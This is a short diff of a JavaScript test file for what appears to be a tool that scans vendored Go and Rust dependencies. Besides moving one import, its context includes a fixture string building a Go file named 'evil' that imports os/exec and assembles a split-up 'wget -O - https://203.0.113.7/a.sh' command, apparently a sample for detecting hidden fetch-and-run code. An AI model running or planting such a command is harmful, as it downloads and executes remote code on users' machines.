@@ -13,7 +13,8 @@ import { tmpdir } from "node:os";
 import { join, dirname } from "node:path";
 import { run } from "../src/index.js";
 import { crateLayout } from "../src/deps.js";
-import { vendorKind, neverBuilt } from "../src/lib/fs.js";
+import { vendorKind } from "../src/lib/fs.js";
+import { neverBuilt } from "../src/lib/collect.js";
 import { cargoLayout, goVendoredModules } from "../src/lib/native.js";
 
 const INIT_GO = 'package evil\n\nimport "os/exec"\n\nvar parts = []string{"wget", " -O - ", "https://203.0.113.7/a.sh", ' +
